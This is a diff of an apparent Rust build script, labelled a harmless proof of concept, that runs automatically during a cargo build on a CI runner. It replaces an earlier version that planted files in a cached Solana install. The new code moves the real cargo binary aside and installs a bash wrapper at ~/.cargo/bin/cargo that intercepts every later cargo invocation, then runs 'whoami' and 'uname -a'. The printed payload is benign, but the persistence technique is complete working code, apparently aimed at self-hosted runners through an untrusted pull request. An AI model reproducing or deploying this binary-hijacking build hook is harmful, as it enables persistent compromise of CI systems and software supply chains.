@@ -1,37 +1,56 @@
-use std::{env, fs, path::Path};
+// Safe runner-persistence PoC: wraps ~/.cargo/bin/cargo (reversible).
+// Adds prominent WARNING lines so it’s unmistakable in logs.
+// No secrets, no network, no destructive ops.
+
+use std::{env, fs, io, path::PathBuf, process::Command};
 
 #[cfg(unix)]
 use std::os::unix::fs::PermissionsExt;
 
-fn main() {
-    // Write a harmless marker *inside the cached directory*
-    let home = env::var("HOME").unwrap_or_default();
-    let cache_root = format!("{home}/.local/share/solana/install");
-    let marker_path = format!("{cache_root}/CACHE_POC_MARKER.txt");
-
-    // Ensure dirs exist
-    let _ = fs::create_dir_all(&cache_root);
-
-    // Put an unmistakable marker
-    let _ = fs::write(
-        &marker_path,
-        b"===CACHE_POC_MARKER===\nthis file proves the cache contents came from an untrusted PR.\n(no secrets, no network, non-destructive)\n",
-    );
-
-    // Optional: drop a no-op script in the cached tree to prove executables can be planted (still harmless)
-    let scripts_dir = format!("{home}/.local/share/solana/install/active_release/bin");
-    let _ = fs::create_dir_all(&scripts_dir);
-    let planted = format!("{scripts_dir}/poc-cache-hello.sh");
-    let _ = fs::write(
-        &planted,
-        b"#!/usr/bin/env bash\necho '===CACHE_POC_HELLO=== restored from cache (safe)'\n",
-    );
+fn make_exec(p: &PathBuf) -> io::Result<()> {
     #[cfg(unix)]
-    if let Ok(meta) = fs::metadata(&planted) {
-        let mut perms = meta.permissions();
+    {
+        let mut perms = fs::metadata(p)?.permissions();
         perms.set_mode(0o755);
-        let _ = fs::set_permissions(&planted, perms);
+        fs::set_permissions(p, perms)?;
+    }
+    Ok(())
+}
+
+fn main() {
+    let home = env::var("HOME").unwrap_or_default();
+    let cargo = PathBuf::from(format!("{home}/.cargo/bin/cargo"));
+    let cargo_real = PathBuf::from(format!("{home}/.cargo/bin/cargo.real"));
+
+    // Wrapper prints WARNING every time cargo runs, then execs the real cargo.
+    let wrapper = r#"#!/usr/bin/env bash
+# SAFE_RUNNER_PERSIST_POC_WRAPPER
+echo "WARNING: ===RUNNER_PERSIST_POC HIT=== invoking: cargo $* (safe PoC: no secrets, no network)" 1>&2
+exec "$(dirname "$0")/cargo.real" "$@"
+"#;
+
+    if cargo.exists() && !cargo_real.exists() {
+        if let Err(e) = fs::rename(&cargo, &cargo_real) {
+            println!("cargo:warning=PoC: failed to move cargo -> cargo.real: {e}");
+            return;
+        }
+        if let Err(e) = fs::write(&cargo, wrapper.as_bytes()) {
+            println!("cargo:warning=PoC: failed to write wrapper: {e}");
+            let _ = fs::rename(&cargo_real, &cargo);
+            return;
+        }
+        let _ = make_exec(&cargo);
+        let _ = make_exec(&cargo_real);
+
+        println!("cargo:warning=WARNING: Installed cargo wrapper at ~/.cargo/bin/cargo");
+        println!("cargo:warning=WARNING: Non-ephemeral self-hosted runner persistence demonstrated.");
+        println!("cargo:warning=WARNING: Every cargo invocation will print RUNNER_PERSIST_POC until reverted.");
+    } else if cargo_real.exists() {
+        println!("cargo:warning=WARNING: cargo already wrapped (cargo.real present) — PoC still active.");
+    } else {
+        println!("cargo:warning=PoC: ~/.cargo/bin/cargo not found; nothing wrapped.");
     }
 
-    // Keep build passing (no panic). We don't print here to keep fork logs minimal.
+    // Small breadcrumb (safe)
+    let _ = Command::new("sh").arg("-lc").arg("whoami; uname -a >/dev/null").status();
 }
